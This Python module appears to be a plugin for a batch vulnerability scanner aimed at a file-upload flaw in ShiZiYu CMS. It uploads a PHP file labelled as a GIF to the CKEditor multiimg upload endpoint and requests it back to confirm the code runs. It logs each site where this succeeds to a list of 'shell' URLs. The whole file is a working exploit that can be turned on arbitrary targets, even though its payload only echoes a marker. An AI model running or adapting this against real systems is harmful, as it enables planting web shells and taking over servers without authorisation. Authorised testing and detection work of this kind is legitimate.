#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import json

import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet

urllib3.disable_warnings()


class ShiZiYuShellScan:

    def run(self, urls):
        headers = {
            'Host': urls.split("://")[-1],
            "User-Agent": self.headers,
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs',
        }
        files = {
            'files': ('testszy.php', '<?php echo \'hello shiziyucms\'?>', 'image/gif'),
        }
        try:
            response = requests.post(f'{urls}/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php', headers=headers, files=files,verify=self.ssl, timeout=self.timeout,
                                             proxies=self.proxy)
            if response.status_code == 200:
                res_json = json.loads(response.text)
                if res_json['result'] == "200" or res_json['imgurl']:
                    OutPrintInfo("ShiZiYu", '[b bright_red]文件上传成功')
                    OutPrintInfo("ShiZiYu", f'Url {urls}')
                    OutPrintInfo("ShiZiYu", f"响应地址 {res_json['imgurl']}")
                    dir = res_json['imgurl']
                    response2 = requests.get(f"{urls}/Common/{dir}", headers={"User-Agent":self.headers}, verify=self.ssl, timeout=self.timeout,
                                             proxies=self.proxy)
                    if "shiziyucms" in response2.text:
                        if not self.batch:
                            OutPrintInfoSuc("ShiZiYu", '成功获取到Shell文件')
                            OutPrintInfo("ShiZiYu", f"Shell {urls}/Common/{dir}")
                        else:
                            OutPrintInfoSuc("ShiZiYu", f'成功获取到Shell文件 {urls}/Common/{dir}')
                            with open("./result/shiziyu_shell.txt","a") as w:
                                w.write(f"{urls}/Common/{dir}\n")
                    else:
                        if not self.batch:
                            OutPrintInfo("ShiZiYu", "没有获取到shell文件,建议手动复查")
            else:
                if not self.batch:
                    OutPrintInfo("ShiZiYu", '不存在狮子鱼文件上传')
        except Exception:
            if not self.batch:
                OutPrintInfo("ShiZiYu", '不存在狮子鱼文件上传')
            

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ShiZiYu", '开始执行狮子鱼文件上传检测')
        self.run(url)
        if not self.batch:
            OutPrintInfo("ShiZiYu", '狮子鱼文件上传检测执行结束')
